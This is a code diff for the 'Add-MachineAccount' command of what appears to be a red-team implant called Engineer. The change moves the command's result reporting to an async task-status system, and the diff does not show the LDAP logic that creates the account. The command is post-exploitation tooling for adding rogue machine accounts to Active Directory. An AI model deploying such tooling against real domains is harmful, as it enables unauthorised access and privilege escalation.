@@ -10,6 +10,7 @@ using System.Threading.Tasks;
 using System.DirectoryServices.AccountManagement;
 using System.Net;
 using System.DirectoryServices.Protocols;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -17,7 +18,7 @@ namespace Engineer.Commands
     {
         public override string Name => "Add-MachineAccount";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             //get the task.Arguments values for /name /password and create a amchine account with that name and password in the current domain 
             var name = task.Arguments.TryGetValue("/name", out string nameValue) ? nameValue : null;
@@ -36,12 +37,14 @@ namespace Engineer.Commands
             //if name is null return an error
             if (name == null)
             {
-                return "[-] Name is required";
+                Tasking.FillTaskResults("[-] Name is required",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             //if password is null return an error
             if (Machinepassword == null)
             {
-                return "[-] Machine Account Password is required";
+                Tasking.FillTaskResults("[-] Machine Account Password is required",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             //create the machine account
             try
@@ -95,13 +98,13 @@ namespace Engineer.Commands
 
                 // Send request
                 oConObject.SendRequest(oLDAPReq);
-                return "[+] Machine Account Created: " + name;
+                Tasking.FillTaskResults("[+] Machine Account Created: " + name,task,EngTaskStatus.Complete);
             }
             catch (Exception e)
             {
                 Console.WriteLine(e.Message);
                 Console.WriteLine(e.StackTrace);
-                return "[-] Error Creating Machine Account: " + e.Message;
+                Tasking.FillTaskResults("[-] Error Creating Machine Account: " + e.Message,task,EngTaskStatus.Failed);
             }
         }
     }
